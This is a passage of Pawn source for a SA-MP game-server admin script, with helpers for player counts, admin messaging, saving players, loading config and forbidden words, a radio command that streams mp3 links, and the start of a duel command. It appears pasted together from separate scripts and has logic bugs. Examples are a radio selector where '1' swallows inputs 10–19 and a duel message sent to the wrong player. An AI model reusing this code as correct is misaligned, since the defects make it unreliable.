	new InVeh; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) InVeh++;
	return InVeh;
}

forward OnBikeCount();
public OnBikeCount()
{
	new BikeCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) {
		new LModel = GetVehicleModel(GetPlayerVehicleID(i));
		switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586:  BikeCount++;
		}
	}
	return BikeCount;
}

forward InCarCount();
public InCarCount()
{
	new PInCarCount;
	for(new i = 0; i < MAX_PLAYERS; i++) {
		if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) {
			new LModel = GetVehicleModel(GetPlayerVehicleID(i));
			switch(LModel)
			{
				case 448,461,462,463,468,471,509,510,521,522,523,581,586: {}
				default: PInCarCount++;
			}
		}
	}
	return PInCarCount;
}

forward AdminCount();
public AdminCount()
{
	new LAdminCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Level] >= 1)	LAdminCount++;
	return LAdminCount;
}

forward RconAdminCount();
public RconAdminCount()
{
	new rAdminCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i)) rAdminCount++;
	return rAdminCount;
}

//==========================[ Remote Console ]==================================

forward UnloadFS();
public UnloadFS()
{
	SendRconCommand("unloadfs ladmin4");
}

forward PrintWarning(const string[]);
public PrintWarning(const string[])
{
    new str[128];
    print("\n\n>		WARNING:\n");
    format(str, sizeof(str), " The  %s  folder is missing from scriptfiles", string);
    print(str);
    print("\n Please Create This Folder And Reload the Filterscript\n\n");
}
forward PutAtPos(playerid);
public PutAtPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x")!=0) {
     	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x")), float(dUserINT(PlayerName2(playerid)).("y")), float(dUserINT(PlayerName2(playerid)).("z")) );
 		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior"))	);
	}
}

forward PutAtDisconectPos(playerid);
public PutAtDisconectPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x1")!=0) {
    	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x1")), float(dUserINT(PlayerName2(playerid)).("y1")), float(dUserINT(PlayerName2(playerid)).("z1")) );
		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior1"))	);
	}
}

TotalGameTime(playerid, &h=0, &m=0, &s=0)
{
    PlayerInfo[playerid][TotalTime] = ( (gettime() - PlayerInfo[playerid][ConnectTime]) + (PlayerInfo[playerid][hours]*60*60) + (PlayerInfo[playerid][mins]*60) + (PlayerInfo[playerid][secs]) );

    h = floatround(PlayerInfo[playerid][TotalTime] / 3600, floatround_floor);
    m = floatround(PlayerInfo[playerid][TotalTime] / 60,   floatround_floor) % 60;
    s = floatround(PlayerInfo[playerid][TotalTime] % 60,   floatround_floor);

    return PlayerInfo[playerid][TotalTime];
}

//==============================================================================
MaxAmmo(playerid)
{
	new slot, weap, ammo;
	for (slot = 0; slot < 14; slot++)
	{
    	GetPlayerWeaponData(playerid, slot, weap, ammo);
		if(IsValidWeapon(weap))
		{
		   	GivePlayerWeapon(playerid, weap, 99999);
		}
	}
	return 1;
}

stock PlayerName2(playerid) {
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, sizeof(name));
  return name;
}
stock GetIp(playerid)
{
	new ip[16];
	GetPlayerIp(playerid, ip, 16);
	return ip;
}

stock pName(playerid)
{
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, sizeof(name));
  return name;
}

stock TimeStamp()
{
	new time = GetTickCount() / 1000;
	return time;
}

stock PlayerSoundForAll(SoundID)
{
	for(new i = 0; i < MAX_PLAYERS; i++) PlayerPlaySound(i, SoundID, 0.0, 0.0, 0.0);
}

stock IsValidWeapon(weaponid)
{
    if (weaponid > 0 && weaponid < 19 || weaponid > 21 && weaponid < 47) return 1;
    return 0;
}

stock IsValidSkin(SkinID)
{
	if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299)) return true;
	else return false;
}

stock IsNumeric(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}

stock IsNumeric2(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '3' || string[i] < '0') return 0;
	}
	return 1;
}

stock ReturnPlayerID(PlayerName[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(strfind(pName(i),PlayerName,true)!=-1) return i;
		}
	}
	return INVALID_PLAYER_ID;
}

GetVehicleModelIDFromName(vname[])
{
	for(new i = 0; i < 211; i++)
	{
		if ( strfind(VehicleNames[i], vname, true) != -1 )
			return i + 400;
	}
	return -1;
}

stock GetWeaponIDFromName(WeaponName[])
{
	if(strfind("molotov",WeaponName,true)!=-1) return 18;
	for(new i = 0; i <= 46; i++)
	{
		switch(i)
		{
			case 0,19,20,21,44,45: continue;
			default:
			{
				new name[32]; GetWeaponName(i,name,32);
				if(strfind(name,WeaponName,true) != -1) return i;
			}
		}
	}
	return -1;
}

stock DisableWord(const badword[], text[])
{
   	for(new i=0; i<256; i++)
   	{
		if (strfind(text[i], badword, true) == 0)
		{
			for(new a=0; a<256; a++)
			{
				if (a >= i && a < i+strlen(badword)) text[a]='*';
			}
		}
	}
}

argpos(const string[], idx = 0, sep = ' ')// (by yom)
{
    for(new i = idx, j = strlen(string); i < j; i++)
        if (string[i] == sep && string[i+1] != sep)
            return i+1;

    return -1;
}

//==============================================================================
forward MessageToAdmins(color,const string[]);
public MessageToAdmins(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageTo4(color,const string[]);
public MessageTo4(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 4) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageToTwice(color,const string[]);
public MessageToTwice(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1 || PlayerInfo[i][Helper] == 1) SendClientMessage(i, color, string);
	}
	return 1;
}

forward MessageTo5(color,const string[]);
public MessageTo5(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 5) SendClientMessage(i, color, string);
	}
	return 1;
}
forward MessageTo6(color,const string[]);
public MessageTo6(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 6) SendClientMessage(i, color, string);
	}
	return 1;
}

stock CMDMessageToAdmins(playerid,command[])
{
	if(ServerInfo[AdminCmdMsg] == 0) return 1;
	new string[128]; GetPlayerName(playerid,string,sizeof(string));
	format(string,sizeof(string),"[INFO]Administrator %s has used %s",string,command);
	return MessageToTwice(blue,string);
}

//==============================================================================
SavePlayer(playerid)
{
   	dUserSetINT(PlayerName2(playerid)).("money",GetPlayerMoney(playerid));
   	dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
   	dUserSetINT(PlayerName2(playerid)).("Score",GetPlayerScore(playerid));
   	dUserSetINT(PlayerName2(playerid)).("Help Moderator",PlayerInfo[playerid][Helper]);
   	dUserSetINT(PlayerName2(playerid)).("Donor",PlayerInfo[playerid][dRank]);

	new h, m, s;
    TotalGameTime(playerid, h, m, s);

	dUserSetINT(PlayerName2(playerid)).("hours", h);
	dUserSetINT(PlayerName2(playerid)).("minutes", m);
	dUserSetINT(PlayerName2(playerid)).("seconds", s);

   	new Float:x,Float:y,Float:z, interior;
   	GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
    dUserSetINT(PlayerName2(playerid)).("x1",floatround(x));
	dUserSetINT(PlayerName2(playerid)).("y1",floatround(y));
	dUserSetINT(PlayerName2(playerid)).("z1",floatround(z));
    dUserSetINT(PlayerName2(playerid)).("interior1",interior);

	new weap1, ammo1, weap2, ammo2, weap3, ammo3, weap4, ammo4, weap5, ammo5, weap6, ammo6;
	GetPlayerWeaponData(playerid,2,weap1,ammo1);// hand gun
	GetPlayerWeaponData(playerid,3,weap2,ammo2);//shotgun
	GetPlayerWeaponData(playerid,4,weap3,ammo3);// SMG
	GetPlayerWeaponData(playerid,5,weap4,ammo4);// AK47 / M4
	GetPlayerWeaponData(playerid,6,weap5,ammo5);// rifle
	GetPlayerWeaponData(playerid,7,weap6,ammo6);// rocket launcher
   	dUserSetINT(PlayerName2(playerid)).("weap1",weap1); dUserSetINT(PlayerName2(playerid)).("weap1ammo",ammo1);
  	dUserSetINT(PlayerName2(playerid)).("weap2",weap2);	dUserSetINT(PlayerName2(playerid)).("weap2ammo",ammo2);
  	dUserSetINT(PlayerName2(playerid)).("weap3",weap3);	dUserSetINT(PlayerName2(playerid)).("weap3ammo",ammo3);
	dUserSetINT(PlayerName2(playerid)).("weap4",weap4); dUserSetINT(PlayerName2(playerid)).("weap4ammo",ammo4);
  	dUserSetINT(PlayerName2(playerid)).("weap5",weap5);	dUserSetINT(PlayerName2(playerid)).("weap5ammo",ammo5);
	dUserSetINT(PlayerName2(playerid)).("weap6",weap6); dUserSetINT(PlayerName2(playerid)).("weap6ammo",ammo6);

	new	Float:health;	GetPlayerHealth(playerid, Float:health);
	new	Float:armour;	GetPlayerArmour(playerid, Float:armour);
	new year,month,day;	getdate(year, month, day);
	new strdate[20];	format(strdate, sizeof(strdate), "%d.%d.%d",day,month,year);
	new file[256]; 		format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );

	dUserSetINT(PlayerName2(playerid)).("health",floatround(health));
    dUserSetINT(PlayerName2(playerid)).("armour",floatround(armour));
	dini_Set(file,"LastOn",strdate);
	dUserSetINT(PlayerName2(playerid)).("loggedin",0);
	dUserSetINT(PlayerName2(playerid)).("TimesOnServer",(dUserINT(PlayerName2(playerid)).("TimesOnServer"))+1);
}

//==============================================================================
#if defined USE_MENUS
DestroyAllMenus()
{
	DestroyMenu(LVehicles); DestroyMenu(twodoor); DestroyMenu(fourdoor); DestroyMenu(fastcar); DestroyMenu(Othercars);
	DestroyMenu(bikes); DestroyMenu(boats); DestroyMenu(planes); DestroyMenu(helicopters ); DestroyMenu(LTime);
	DestroyMenu(XWeapons); DestroyMenu(XWeaponsBig); DestroyMenu(XWeaponsSmall); DestroyMenu(XWeaponsMore);
	DestroyMenu(LWeather); DestroyMenu(LTuneMenu); DestroyMenu(PaintMenu); DestroyMenu(LCars); DestroyMenu(LCars2);
	DestroyMenu(LTele); DestroyMenu(LasVenturasMenu); DestroyMenu(LosSantosMenu); DestroyMenu(SanFierroMenu);
	DestroyMenu(LMainMenu); DestroyMenu(DesertMenu); DestroyMenu(FlintMenu); DestroyMenu(MountChiliadMenu); DestroyMenu(InteriorsMenu);
	DestroyMenu(AdminEnable); DestroyMenu(AdminDisable);
}
#endif

//==============================================================================
#if defined DISPLAY_CONFIG
stock ConfigInConsole()
{
	print(" ________ Configuration ___________\n");
	print(" __________ Chat & Messages ______");
	if(ServerInfo[AntiSwear] == 0) print("  Anti Swear:              Disabled "); else print("  Anti Swear:             Enabled ");
	if(ServerInfo[AntiSpam] == 0)  print("  Anti Spam:               Disabled "); else print("  Anti Spam:              Enabled ");
	if(ServerInfo[ReadCmds] == 0)  print("  Read Cmds:               Disabled "); else print("  Read Cmds:              Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Read PMs:                Disabled "); else print("  Read PMs:               Enabled ");
	if(ServerInfo[ConnectMessages] == 0) print("  Connect Messages:        Disabled "); else print("  Connect Messages:       Enabled ");
  	if(ServerInfo[AdminCmdMsg] == 0) print("  Admin Cmd Messages:     Disabled ");  else print("  Admin Cmd Messages:     Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Anti capital letters:    Disabled \n"); else print("  Anti capital letters:   Enabled \n");
	print(" __________ Skins ________________");
	if(ServerInfo[AdminOnlySkins] == 0) print("  AdminOnlySkins:         Disabled "); else print("  AdminOnlySkins:         Enabled ");
	printf("  Admin Skin 1 is:         %d", ServerInfo[AdminSkin] );
	printf("  Admin Skin 2 is:         %d\n", ServerInfo[AdminSkin2] );
	print(" ________ Server Protection ______");
	if(ServerInfo[NameKick] == 0) print("  Bad Name Kick:           Disabled\n"); else print("  Bad Name Kick:           Enabled\n");
	print(" __________ Ping Control _________");
	if(ServerInfo[MaxPing] == 0) print("  Ping Control:            Disabled"); else print("  Ping Control:            Enabled");
	printf("  Max Ping:                %d\n", ServerInfo[MaxPing] );
	print(" __________ Players ______________");
	if(ServerInfo[GiveWeap] == 0) print("  Save/Give Weaps:         Disabled"); else print("  Save/Give Weaps:         Enabled");
	if(ServerInfo[GiveMoney] == 0) print("  Save/Give Money:         Disabled\n"); else print("  Save/Give Money:         Enabled\n");
	print(" __________ Other ________________");
	printf("  Max Admin Level:         %d", ServerInfo[MaxAdminLevel] );
	if(ServerInfo[Locked] == 0) print("  Server Locked:           No"); else print("  Server Locked:           Yes");
	if(ServerInfo[AutoLogin] == 0) print("  Auto Login:             Disabled\n"); else print("  Auto Login:              Enabled\n");
}
#endif

//=====================[ Configuration ] =======================================
stock UpdateConfig()
{
	new file[256], File:file2, string[100]; format(file,sizeof(file),"ladmin/config/Config.ini");
	ForbiddenWordCount = 0;
	BadNameCount = 0;
	BadPartNameCount = 0;

	if(!dini_Exists("ladmin/config/aka.txt")) dini_Create("ladmin/config/aka.txt");

	if(!dini_Exists(file))
	{
		dini_Create(file);
		print("\n >Configuration File Successfully Created");
	}

	if(!dini_Isset(file,"MaxPing")) dini_IntSet(file,"MaxPing",1200);
	if(!dini_Isset(file,"ReadPms")) dini_IntSet(file,"ReadPMs",1);
	if(!dini_Isset(file,"ReadCmds")) dini_IntSet(file,"ReadCmds",1);
	if(!dini_Isset(file,"MaxAdminLevel")) dini_IntSet(file,"MaxAdminLevel",5);
	if(!dini_Isset(file,"AdminOnlySkins")) dini_IntSet(file,"AdminOnlySkins",0);
	if(!dini_Isset(file,"AdminSkin")) dini_IntSet(file,"AdminSkin",217);
	if(!dini_Isset(file,"AdminSkin2")) dini_IntSet(file,"AdminSkin2",214);
	if(!dini_Isset(file,"AntiSpam")) dini_IntSet(file,"AntiSpam",1);
	if(!dini_Isset(file,"AntiSwear")) dini_IntSet(file,"AntiSwear",1);
	if(!dini_Isset(file,"NameKick")) dini_IntSet(file,"NameKick",1);
 	if(!dini_Isset(file,"PartNameKick")) dini_IntSet(file,"PartNameKick",1);
	if(!dini_Isset(file,"NoCaps")) dini_IntSet(file,"NoCaps",0);
	if(!dini_Isset(file,"Locked")) dini_IntSet(file,"Locked",0);
	if(!dini_Isset(file,"SaveWeap")) dini_IntSet(file,"SaveWeap",1);
	if(!dini_Isset(file,"SaveMoney")) dini_IntSet(file,"SaveMoney",1);
	if(!dini_Isset(file,"ConnectMessages")) dini_IntSet(file,"ConnectMessages",1);
	if(!dini_Isset(file,"AdminCmdMessages")) dini_IntSet(file,"AdminCmdMessages",1);
	if(!dini_Isset(file,"AutoLogin")) dini_IntSet(file,"AutoLogin",1);
	if(!dini_Isset(file,"MaxMuteWarnings")) dini_IntSet(file,"MaxMuteWarnings",4);
	if(!dini_Isset(file,"MustLogin")) dini_IntSet(file,"MustLogin",0);
	if(!dini_Isset(file,"MustRegister")) dini_IntSet(file,"MustRegister",0);

	if(dini_Exists(file))
	{
		ServerInfo[MaxPing] = dini_Int(file,"MaxPing");
		ServerInfo[ReadPMs] = dini_Int(file,"ReadPMs");
		ServerInfo[ReadCmds] = dini_Int(file,"ReadCmds");
		ServerInfo[MaxAdminLevel] = dini_Int(file,"MaxAdminLevel");
		ServerInfo[AdminOnlySkins] = dini_Int(file,"AdminOnlySkins");
		ServerInfo[AdminSkin] = dini_Int(file,"AdminSkin");
		ServerInfo[AdminSkin2] = dini_Int(file,"AdminSkin2");
		ServerInfo[AntiSpam] = dini_Int(file,"AntiSpam");
		ServerInfo[AntiSwear] = dini_Int(file,"AntiSwear");
		ServerInfo[NameKick] = dini_Int(file,"NameKick");
		ServerInfo[PartNameKick] = dini_Int(file,"PartNameKick");
		ServerInfo[NoCaps] = dini_Int(file,"NoCaps");
		ServerInfo[Locked] = dini_Int(file,"Locked");
		ServerInfo[GiveWeap] = dini_Int(file,"SaveWeap");
		ServerInfo[GiveMoney] = dini_Int(file,"SaveMoney");
		ServerInfo[ConnectMessages] = dini_Int(file,"ConnectMessages");
		ServerInfo[AdminCmdMsg] = dini_Int(file,"AdminCmdMessages");
		ServerInfo[AutoLogin] = dini_Int(file,"AutoLogin");
		ServerInfo[MaxMuteWarnings] = dini_Int(file,"MaxMuteWarnings");
		ServerInfo[MustLogin] = dini_Int(file,"MustLogin");
		ServerInfo[MustRegister] = dini_Int(file,"MustRegister");
		print("\n -Configuration Settings Loaded");
	}

	//forbidden names
	if((file2 = fopen("ladmin/config/ForbiddenNames.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadNames[BadNameCount] = string;
            BadNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Names Loaded", BadNameCount);
	}

	//forbidden part of names
	if((file2 = fopen("ladmin/config/ForbiddenPartNames.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadPartNames[BadPartNameCount] = string;
            BadPartNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Tags Loaded", BadPartNameCount);
	}

	//forbidden words
	if((file2 = fopen("ladmin/config/ForbiddenWords.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            ForbiddenWords[ForbiddenWordCount] = string;
            ForbiddenWordCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Words Loaded", ForbiddenWordCount);
	}
}
//=====================[ SAVING DATA ] =========================================

forward SaveToFile(filename[],text[]);
public SaveToFile(filename[],text[])
{
    #if defined SAVE_LOGS
    new File:LAdminfile, filepath[256], string[256], year,month,day, hour,minute,second;
    getdate(year,month,day); gettime(hour,minute,second);

    format(filepath,sizeof(filepath),"ladmin/logs/%s.txt",filename);
    LAdminfile = fopen(filepath,io_append);
    format(string,sizeof(string),"[%d.%d.%d %d:%d:%d] %s\r\n %d",day,month,year,hour,minute,second,text);
    fwrite(LAdminfile,string);
    fclose(LAdminfile);
    #endif

    return 1;
}
public OnFilterScriptInit()
{
	print("\n--------------------------------------");
	print("Radio System loaded");
	print("--------------------------------------\n");
	return 1;
}

public OnFilterScriptExit()
{
	return 1;
}

CMD:radiostart(playerid, params[])
{
      new radiolink[100];
   if(sscanf(params,"s[100]", radiolink)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /radiostart [1 - 20]");
   if(strfind(radiolink, "1", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"See You Again Wiz Khalifa");
      PlayAudioStreamForPlayer(playerid,"http://freemp3.se/music/user_folder/Wiz%20Khalifa%20Ft%20Charlie%20Puth%20See%20You%20Again%20Furious%207%20Soundtrack%20-%201426212571.mp3");
   }
   else if(strfind(radiolink, "2", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"We Own It Wiz Khalifa");
      PlayAudioStreamForPlayer(playerid,"http://a.tumblr.com/tumblr_mmx0g4qjU81qil8omo1.mp3");
   }
   else if(strfind(radiolink, "3", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Ten Feet Tall Afrojack");
      PlayAudioStreamForPlayer(playerid,"http://tegos.kz/new/mp3_full/Afrojack_feat_Wrabel_-_Ten_Feet_Tall.mp3");
   }
   else if(strfind(radiolink, "4", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Get low");
	  PlayAudioStreamForPlayer(playerid,"http://m.waptrick.me/files/sfd258/128917/Fast_And_Furious_7_Get_Low_Mp3_Song_-_Dillon_Francis_Ft._DJ_Snake(WapTrick.ME).mp3");
   }
   else if(strfind(radiolink, "5", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Wiggle Wiggle");
      PlayAudioStreamForPlayer(playerid,"http://trendingmp3.com/music/user_folder/Wiggle%20Feat%20Snoop%20Dogg%20Jason%20Derulo%20-%201409573880.mp3");
   }
   else if(strfind(radiolink, "6", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"The Wanted-glad u came");
      PlayAudioStreamForPlayer(playerid,"http://waptrick.me/music/mp3/download/Latest%20Hit%20Albums/Billboard%20Hot%20100%20(Sep%202012)/040%20The%20Wanted%20-%20Glad%20You%20Came.mp3");
   }
   else if(strfind(radiolink, "7", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"This is my legacy");
      PlayAudioStreamForPlayer(playerid,"https://ec-media.sndcdn.com/YjOQe9N7h64H.128.mp3?f10880d39085a94a0418a7ef69b03d522cd6dfee9399eeb9a522029f6af0bc35024486aaee7225acb479a979ff5037d6f48f29d03c2b861234912b029272dde81ae1155d23");
   }
   else if(strfind(radiolink, "8", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Turn down for what");
      PlayAudioStreamForPlayer(playerid,"https://ec-media.sndcdn.com/mUdKHJlfK33I.128.mp3?f10880d39085a94a0418a7ef69b03d522cd6dfee9399eeb9a522029f6af0bf3990f6fac1fce2edf505b77dadf13aca8e0a1e20ce66327cac9c403e833afb447fab5c5f1413");
   }
   else if(strfind(radiolink, "9", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Somebodys Me");
      PlayAudioStreamForPlayer(playerid,"http://raagwap.com/data/29530/Somebodys_Me-Enrique_Iglesias[www.MastJatt.Com].mp3");
   }
   else if(strfind(radiolink, "10", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Hey Mama");
      PlayAudioStreamForPlayer(playerid,"http://soundfox.net/audio/10.%20David%20Guetta%20-%20Hey%20Mama%20(feat.%20Nicki%20Minaj%20and%20Afrojack).mp3");
   }
   else if(strfind(radiolink, "11", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "12", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "13", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "14", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "15", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "16", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "17", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "18", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "19", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   else if(strfind(radiolink, "20", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Zindagi Aa Raha Hoon Mein Atif Aslam");
      PlayAudioStreamForPlayer(playerid,"http://cdn.clearpost.in/files/Pop/Atif%20Aslam%20-%20Zindagi%20Aa%20Raha%20Hoon%20Main/01%20Zindagi%20Aa%20Raha%20Hoon%20Main%20-%20Atif%20Aslam%20128kbps%20[Songspkmp3.me].mp3");
   }
   return 1;
}
CMD:radiostop(playerid, params[])
{
   SendClientMessage(playerid,0xFFFF00C8,"Stopped all the streamings");
   StopAudioStreamForPlayer(playerid);
   return 1;
}
//==============================================================================
CMD:duel(playerid,params[]){
if(DuelActive == true) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}There is already an ongoing duel. Wait for it to end");
new target,cost;
if(sscanf(params,"ui",target,cost)) return SendClientMessage(playerid,0xFF0000FF,"USAGE:{FFFFFF}/duel [id/name] [winning price]");
if(!IsPlayerConnected(target)) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}Player not connected");
if(target == playerid) return SendClientMessage(playerid,0xFF0000FF,"SERVER:{FFFFFF}You want to fight with yourself? type /kill");
if(cost < 5000) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}Cost should be higher than $5000");
if(GetPlayerMoney(playerid) < cost) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}You don't have enough cash");
new cName[32],string[128];
GetPlayerName(playerid,cName,sizeof(cName));
format(string,sizeof(string),"%s(%i) has sent you a duel invitation. /accept to accept, or /decline to refuse",cName,playerid);
SendClientMessage(target,0xFFFF00FF,string);
foreach(Player,i)
 {if(Invited[i] == playerid || Invited[i] == target)Invited[i] = -1;}
Invited[playerid] = -1;
Invited[target] = playerid;
GetPlayerName(target,cName,sizeof(cName));
format(string,sizeof(string),"Duel Invitation has been sent to %s(%i)",cName,target);
SendClientMessage(target,0xFFFF00FF,string);
WinningPrice = cost;
return 1;}
CMD:accept(playerid,params[]){
if(Invited[playerid] == -1) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}You haven't recieved duel invitation from anyone");
if(DuelActive == true) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}There is already an ongoing duel. Wait for it to end");
if(GetPlayerState(playerid) == 9) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}You can not accept a duel invitation during spectating");
